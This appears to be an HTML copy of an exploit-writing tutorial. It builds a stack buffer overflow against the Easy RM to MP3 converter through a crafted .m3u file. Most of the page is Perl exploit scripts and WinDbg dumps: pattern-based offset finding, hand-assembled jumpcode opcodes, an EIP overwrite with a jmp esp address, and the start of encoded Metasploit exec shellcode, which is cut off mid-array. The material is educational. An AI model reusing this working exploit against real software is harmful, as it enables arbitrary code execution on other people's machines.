<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Small Buffers and Custom Jumpcode</title>
</head><body>We have talked about various ways to make EIP jump to our shellcode. In all scenario’s, we have had the luxury to be able to put this shellcode in one piece in the buffer. But what if we see that we don’t have enough space to host the entire shellcode ?<br/>
<br/>
In our exercise, we have been using 26094 bytes before overwriting EIP, and we have noticed that ESP points to 26094+4 bytes, and that we have plenty of space from that point forward. But what if we only had 50 bytes (ESP -&gt; ESP+50 bytes). What if our tests showed that everything that was written after those 50 bytes were not usable ? 50 bytes for hosting shellcode is not a lot. So we need to find a way around that. So perhaps we can use the 26094 bytes that were used to trigger the actual overflow.<br/>
<br/>
First, we need to find these 26094 bytes somewhere in memory. If we cannot find them anywhere, it’s going to be difficult to reference them. In fact, if we can find these bytes and find out that we have another register pointing (or almost pointing) at these bytes, it may even be quite easy to put our shellcode in there.<br/>
<br/>
If you run some basic tests against Easy RM to MP3, you will notice that parts of the 26094 bytes are also visible in the ESP dump :<br/>
<br/>
my $file= "test1.m3u";<br/>
my $junk= "A" x 26094;<br/>
my $eip = "BBBB";<br/>
my $preshellcode = "X" x 54; &nbsp;#let's pretend this is the only space we have available<br/>
my $nop = "\x90" x 230; &nbsp;#added some nops to visually separate our 54 X's from other data<br/>
<br/>
open($FILE,"&gt;$file");<br/>
print $FILE $junk.$eip.$preshellcode.$nop;<br/>
close($FILE);<br/>
print "m3u File Created successfully\n";<br/>
<br/>
After opening the test1.m3u file, we get this :<br/>
<br/>
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715<br/>
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0 &nbsp; &nbsp; &nbsp; &nbsp; nv up ei pl nz na pe nc<br/>
cs=001b &nbsp;ss=0023 &nbsp;ds=0023 &nbsp;es=0023 &nbsp;fs=003b &nbsp;gs=0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; efl=00000206<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0x42424231:<br/>
42424242 ?? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;???<br/>
0:000&gt; d esp<br/>
000ff730 &nbsp;58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 &nbsp;XXXXXXXXXXXXXXXX<br/>
000ff740 &nbsp;58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 &nbsp;XXXXXXXXXXXXXXXX<br/>
000ff750 &nbsp;58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 &nbsp;XXXXXXXXXXXXXXXX<br/>
000ff760 &nbsp;58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;XX..............<br/>
000ff770 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff780 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff790 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7a0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
0:000&gt; d<br/>
000ff7b0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7c0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7d0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7e0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7f0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff800 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff810 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff820 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
0:000&gt; d<br/>
000ff830 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff840 &nbsp;90 90 90 90 90 90 90 90-00 41 41 41 41 41 41 41 &nbsp;.........AAAAAAA<br/>
000ff850 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff860 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff870 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff880 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff890 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff8a0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
<br/>
We can see our 50 X’s at ESP. Let’s pretend this is the only space available for shellcode (we think). However, when we look further down the stack, we can find back A’s starting from address 000ff849 (=ESP+281).<br/>
<br/>
When we look at other registers, there’s no trace of X’s or A’s. (You can just dump the registers, or look for a number of A’s in memory.<br/>
<br/>
So this is it. We can jump to ESP to execute some code, but we only have 50 bytes to spend on shellcode. We also see other parts of our buffer at a lower position in the stack… in fact, when we continue to dump the contents of ESP, we have a huge buffer filled with A’s…<br/>
<br/>
Luckily there is a way to host the shellcode in the A’s and use the X’s to jump to the A’s. In order to make this happen, we need a couple of things<br/>
<ul><li>The position inside the buffer with 26094 A’s that is now part of ESP, at 000ff849 (“Where do the A’s shown in ESP really start ?) (so if we want to put our shellcode inside the A’s, we need to know where exactly it needs to be put)</li>
<li>“Jumpcode” : code that will make the jump from the X’s to the A’s. This code cannot be larger than 50 bytes (because that’s all we have available directly at ESP)</li>
</ul>
<br/>
We can find the exact position by using guesswork, by using custom patterns, or by using one of metasploits patterns.<br/>
<br/>
We’ll use one of metasploit’s patterns… we’ll start with a small one (so if we are looking at the start of the A’s, then we would not have to work with large amount of character patterns :-) )<br/>
<br/>
Generate a pattern of let’s say 1000 characters, and replace the first 1000 characters in the perl script with the pattern (and then add 25101 A’s)<br/>
<br/>
<br/>
<br/>
my $file= "test1.m3u";<br/>
my $pattern = "Aa0Aa1Aa2Aa3Aa4Aa....g8Bg9Bh0Bh1Bh2B";<br/>
my $junk= "A" x 25101;<br/>
my $eip = "BBBB";<br/>
my $preshellcode = "X" x 54; &nbsp;#let's pretend this is the only space we have available at ESP<br/>
my $nop = "\x90" x 230; &nbsp;#added some nops to visually separate our 54 X's from other data in the ESP dump<br/>
<br/>
open($FILE,"&gt;$file");<br/>
print $FILE $pattern.$junk.$eip.$preshellcode.$nop;<br/>
close($FILE);<br/>
print "m3u File Created successfully\n";<br/>
<br/>
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715<br/>
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0 &nbsp; &nbsp; &nbsp; &nbsp; nv up ei pl nz na pe nc<br/>
cs=001b &nbsp;ss=0023 &nbsp;ds=0023 &nbsp;es=0023 &nbsp;fs=003b &nbsp;gs=0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; efl=00000206<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0x42424231:<br/>
42424242 ?? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;???<br/>
0:000&gt; d esp<br/>
000ff730 &nbsp;58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 &nbsp;XXXXXXXXXXXXXXXX<br/>
000ff740 &nbsp;58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 &nbsp;XXXXXXXXXXXXXXXX<br/>
000ff750 &nbsp;58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 &nbsp;XXXXXXXXXXXXXXXX<br/>
000ff760 &nbsp;58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;XX..............<br/>
000ff770 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff780 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff790 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7a0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
0:000&gt; d<br/>
000ff7b0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7c0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7d0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7e0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7f0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff800 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff810 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff820 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
0:000&gt; d<br/>
000ff830 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff840 &nbsp;90 90 90 90 90 90 90 90-00 35 41 69 36 41 69 37 &nbsp;.........5Ai6Ai7<br/>
000ff850 &nbsp;41 69 38 41 69 39 41 6a-30 41 6a 31 41 6a 32 41 &nbsp;Ai8Ai9Aj0Aj1Aj2A<br/>
<br/>
What we see at 000ff849 is definitely part of the pattern. The first 4 characters are 5Ai6<br/>
<br/>
Using metasploit pattern_offset utility, we see that these 4 characters are at offset 257. So instead of putting 26094 A’s in the file, we’ll put 257 A’s, then our shellcode, and fill up the rest of the 26094 characters with A’s again. Or even better, we’ll start with only 250 A’s, then 50 NOP’s, then our shellcode, and then fill up the rest with A’s. That way, we don’t have to be very specific when jumping… If we can land in the NOP’s before the shellcode, it will work just fine.<br/>
<br/>
Let’s see how the script and stack look like when we set this up :<br/>
<br/>
my $file= "test1.m3u";<br/>
my $buffersize = 26094;<br/>
<br/>
my $junk= "A" x 250;<br/>
my $nop = "\x90" x 50;<br/>
my $shellcode = "\xcc";<br/>
<br/>
my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));<br/>
<br/>
my $eip = "BBBB";<br/>
my $preshellcode = "X" x 54; &nbsp;#let's pretend this is the only space we have available<br/>
my $nop2 = "\x90" x 230; &nbsp;#added some nops to visually separate our 54 X's from other data<br/>
<br/>
my $buffer = $junk.$nop.$shellcode.$restofbuffer;<br/>
<br/>
print "Size of buffer : ".length($buffer)."\n";<br/>
<br/>
open($FILE,"&gt;$file");<br/>
print $FILE $buffer.$eip.$preshellcode.$nop2;<br/>
close($FILE);<br/>
print "m3u File Created successfully\n";<br/>
<br/>
When the application dies, we can see our 50 NOPs starting at 000ff848, followed by the shellcode (0x90 at 000ff874), and then again followed by the A’s. Ok, that looks fine.<br/>
<br/>
(188.c98): Access violation - code c0000005 (!!! second chance !!!)<br/>
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715<br/>
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0 &nbsp; &nbsp; &nbsp; &nbsp; nv up ei pl nz na pe nc<br/>
cs=001b &nbsp;ss=0023 &nbsp;ds=0023 &nbsp;es=0023 &nbsp;fs=003b &nbsp;gs=0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; efl=00000206<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0x42424231:<br/>
42424242 ?? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;???<br/>
0:000&gt; d esp<br/>
000ff730 &nbsp;58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 &nbsp;XXXXXXXXXXXXXXXX<br/>
000ff740 &nbsp;58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 &nbsp;XXXXXXXXXXXXXXXX<br/>
000ff750 &nbsp;58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 &nbsp;XXXXXXXXXXXXXXXX<br/>
000ff760 &nbsp;58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;XX..............<br/>
000ff770 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff780 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff790 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7a0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
0:000&gt; d<br/>
000ff7b0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7c0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7d0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7e0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff7f0 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff800 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff810 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff820 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
0:000&gt; d<br/>
000ff830 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff840 &nbsp;90 90 90 90 90 90 90 90-00 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff850 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff860 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff870 &nbsp;90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41 &nbsp;.....AAAAAAAAAAA<br/>
<br/>
The second thing we need to do is build our jumpcode that needs to be placed at ESP. The goal of the jumpcode is to jump to ESP+281<br/>
<br/>
Writing jump code is as easy as writing down the required statements in assembly and then translating them to opcode (making sure that we don’t have any null bytes or other restricted characters at the same time) :-)<br/>
<br/>
Jumping to ESP+281 would require : Add 281 to the ESP register, and then perform jump esp. 281 = 119h. Don’t try to add everything in one shot, or you may end up with opcode that contains null bytes.<br/>
<br/>
Since we have some flexibility (due to the NOP’s before our shellcode), we don’t have to be very precise either. As long as we add 281 (or more), it will work. We have 50 bytes for our jumpcode, but that should not be a problem.<br/>
<br/>
Let’s add 0x5e (94) to esp, 3 times. Then do the jump to esp. The assembly commands are :<br/>
<ul><li>add <div style="text-align: justify">esp,0x5e</div></li>
<div style="text-align: justify"><li>add esp,0x5e</li>
<li>add esp,0x5e</li>
</div><li><div style="text-align: justify">jmp es</div>p</li>
</ul>
<br/>
Using windbg, we can get the opcode :<br/>
<br/>
0:014&gt; a<br/>
7c901211 add esp,0x5e<br/>
add esp,0x5e<br/>
7c901214 add esp,0x5e<br/>
add esp,0x5e<br/>
7c901217 add esp,0x5e<br/>
add esp,0x5e<br/>
7c90121a jmp esp<br/>
jmp esp<br/>
7c90121c <br/>
<br/>
0:014&gt; u 7c901211<br/>
ntdll!DbgBreakPoint+0x3:<br/>
7c901211 83c45e &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;add &nbsp; &nbsp; esp,5Eh<br/>
7c901214 83c45e &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;add &nbsp; &nbsp; esp,5Eh<br/>
7c901217 83c45e &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;add &nbsp; &nbsp; esp,5Eh<br/>
7c90121a ffe4 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;jmp &nbsp; &nbsp; esp<br/>
<br/>
Ok, so the opcode for the entire jumpcode is 0x83,0xc4,0x5e,0x83,0xc4,0x5e,0x83,0xc4,0x5e,0xff,0xe4<br/>
<br/>
my $file= "test1.m3u";<br/>
my $buffersize = 26094;<br/>
<br/>
my $junk= "A" x 250;<br/>
my $nop = "\x90" x 50;<br/>
my $shellcode = "\xcc"; &nbsp;#position 300<br/>
<br/>
my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));<br/>
<br/>
my $eip = "BBBB";<br/>
my $preshellcode = "X" x 4;<br/>
my $jumpcode = "\x83\xc4\x5e" . &nbsp; #add esp,0x5e<br/>
&nbsp; &nbsp;"\x83\xc4\x5e" . &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #add esp,0x5e<br/>
&nbsp; &nbsp;"\x83\xc4\x5e" . &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #add esp,0x5e<br/>
&nbsp; &nbsp;"\xff\xe4"; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#jmp esp<br/>
<br/>
my $nop2 = "0x90" x 10; &nbsp; # only used to visually separate<br/>
<br/>
my $buffer = $junk.$nop.$shellcode.$restofbuffer;<br/>
<br/>
print "Size of buffer : ".length($buffer)."\n";<br/>
<br/>
open($FILE,"&gt;$file");<br/>
print $FILE $buffer.$eip.$preshellcode.$jumpcode;<br/>
close($FILE);<br/>
print "m3u File Created successfully\n";<br/>
<br/>
The jumpcode is perfectly placed at ESP. When the shellcode is called, ESP would point into the NOPs (between 00ff842 and 000ff873). Shellcode starts at 000ff874<br/>
<br/>
(45c.f60): Access violation - code c0000005 (!!! second chance !!!)<br/>
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006608<br/>
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0 &nbsp; &nbsp; &nbsp; &nbsp; nv up ei pl nz na pe nc<br/>
cs=001b &nbsp;ss=0023 &nbsp;ds=0023 &nbsp;es=0023 &nbsp;fs=003b &nbsp;gs=0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; efl=00000206<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0x42424231:<br/>
42424242 ?? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;???<br/>
0:000&gt; d esp<br/>
000ff730 &nbsp;83 c4 5e 83 c4 5e 83 c4-5e ff e4 00 01 00 00 00 &nbsp;..^..^..^.......<br/>
000ff740 &nbsp;30 f7 0f 00 00 00 00 00-41 41 41 41 41 41 41 41 &nbsp;0.......AAAAAAAA<br/>
000ff750 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff760 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff770 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff780 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff790 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff7a0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
0:000&gt; d<br/>
000ff7b0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff7c0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff7d0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff7e0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff7f0 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff800 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff810 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff820 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
0:000&gt; d<br/>
000ff830 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff840 &nbsp;41 41 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;AA..............<br/>
000ff850 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff860 &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff870 &nbsp;90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41 &nbsp;.....AAAAAAAAAAA<br/>
000ff880 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff890 &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
<br/>
The last thing we need to do is overwrite EIP with a “jmp esp”. From part 1 of the tutorial, we know that this can be achieved via address 0x01ccf23a<br/>
<br/>
What will happen when the overflow occurs ?<br/>
<ul><li>Real shellcode will be placed in the first part of the string that is sent, and will end up at ESP+300. The real shellcode is prepended with NOP’s to allow the jump to be off a little bit</li>
<li>EIP will be overwritten with 0x01ccf23a (points to a dll, run “JMP ESP”)</li>
<li>The data after overwriting EIP will be overwritten with jump code that adds 282 to ESP and then jumps to that address.</li>
<li>After the payload is sent, EIP will jump to esp. This will triggger the jump code to jump to ESP+282. Nop sled, and shellcode gets executed.</li>
</ul>
<br/>
Let’s try with a break as real shellcode :<br/>
<br/>
my $file= "test1.m3u";<br/>
my $buffersize = 26094;<br/>
<br/>
my $junk= "A" x 250;<br/>
my $nop = "\x90" x 50;<br/>
my $shellcode = "\xcc"; &nbsp;#position 300<br/>
<br/>
my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));<br/>
<br/>
my $eip = pack('V',0x01ccf23a); &nbsp;#jmp esp from MSRMCcodec02.dll<br/>
<br/>
my $preshellcode = "X" x 4;<br/>
my $jumpcode = "\x83\xc4\x5e" . &nbsp; #add esp,0x5e<br/>
&nbsp; &nbsp;"\x83\xc4\x5e" . &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #add esp,0x5e<br/>
&nbsp; &nbsp;"\x83\xc4\x5e" . &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #add esp,0x5e<br/>
&nbsp; &nbsp;"\xff\xe4"; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#jmp esp<br/>
<br/>
my $buffer = $junk.$nop.$shellcode.$restofbuffer;<br/>
<br/>
print "Size of buffer : ".length($buffer)."\n";<br/>
<br/>
open($FILE,"&gt;$file");<br/>
print $FILE $buffer.$eip.$preshellcode.$jumpcode;<br/>
close($FILE);<br/>
print "m3u File Created successfully\n";<br/>
<br/>
The generated m3u file will bring us right at our shellcode (which is a break). (EIP = 0x000ff874 = begin of shellcode )<br/>
<br/>
(d5c.c64): Break instruction exception - code 80000003 (!!! second chance !!!)<br/>
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006608<br/>
eip=<span style="color: #ff0000">000ff874</span>&nbsp;esp=000ff84a ebp=003440c0 iopl=0 &nbsp; &nbsp; &nbsp; &nbsp; nv up ei pl nz ac po nc<br/>
cs=001b &nbsp;ss=0023 &nbsp;ds=0023 &nbsp;es=0023 &nbsp;fs=003b &nbsp;gs=0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; efl=00000212<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0xff863:<br/>
000ff874 cc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;int &nbsp; &nbsp; 3<br/>
0:000&gt; d esp<br/>
000ff84a &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff85a &nbsp;90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 &nbsp;................<br/>
000ff86a &nbsp;90 90 90 90 90 90 90 90-90 90 <span style="color: #ff0000">cc</span>&nbsp;41 41 41 41 41 &nbsp;...........AAAAA<br/>
000ff87a &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff88a &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff89a &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff8aa &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
000ff8ba &nbsp;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 &nbsp;AAAAAAAAAAAAAAAA<br/>
<br/>
Replace the break with some real shellcode (and replace the A’s with NOPs)… (shellcode : excluded characters 0x00, 0xff, 0xac, 0xca)<br/>
<br/>
When you replace the A’s with NOPs, you’ll have more space to jump into, so we can live with jumpcode that only jumps 188 positions further (2 times 5e)<br/>
<br/>
my $file= "test1.m3u";<br/>
my $buffersize = 26094;<br/>
<br/>
my $junk= "\x90" x 200;<br/>
my $nop = "\x90" x 50;<br/>
<br/>
# windows/exec - 303 bytes<br/>
# http://www.metasploit.com<br/>
# Encoder: x86/alpha_upper<br/>
# EXITFUNC=seh, CMD=calc<br/>
my $shellcode = "\x89\xe2\xd9\xeb\xd9\x72\xf4\x5b\x53\x59\x49\x49\x49\x49" .<br/>
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .<br/>
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .<br/>
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .<br/>
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d" .<br/>
"\x38\x51\x54\x45\x50\x43\x30\x45\x50\x4c\x4b\x51\x55\x47" .<br/>
"\x4c\x4c\x4b\x43\x4c\x44\x45\x43\x48\x43\x31\x4a\x4f\x4c" .<br/>
"\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x51\x30\x45\x51\x4a" .<br/>
"\x4b\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x45\x51\x4a\x4e\x46" .<br/>
"\x51\x49\x50\x4a\x39\x4e\x4c\x4b\x34\x49\x50\x44\x34\x45" .<br/>
"\x57\x49\x51\x49\x5a\x44\x4d\x45\x51\x48\x42\x4a\x4b\x4c" .<br/>
"\x34\x47\x4b\x50\x54\x51\x34\x45\x54\x44\x35\x4d\x35\x4c" .<br/>
"\x4b\x51\x4f\x51\x34\x43\x31\x4a\x4b\x42\x46\x4c\x4b\x44" .<br/>
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c" .<br/>
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4b\x39\x51\x4c\x46" .<br/>
"\x44\x45\x54\x48\x43\x51\x4f\x46\x51\x4c\x36\x43\x50\x50" .<br/>
"\x56\x43\x54\x4c\x4b\x47\x36\x46\x50\x4c\x4b\x47\x30\x44" .<br/>
"\x4c\x4c\x4b\x42\x50\x45\x4c\x4e\x4d\x4c\x4b\x43\x58\x44" .<br/>
"\x48\x4d\x59\x4c\x38\x4d\x53\x49\x50\x42\x4a\x46\x30\x45" .<br/>
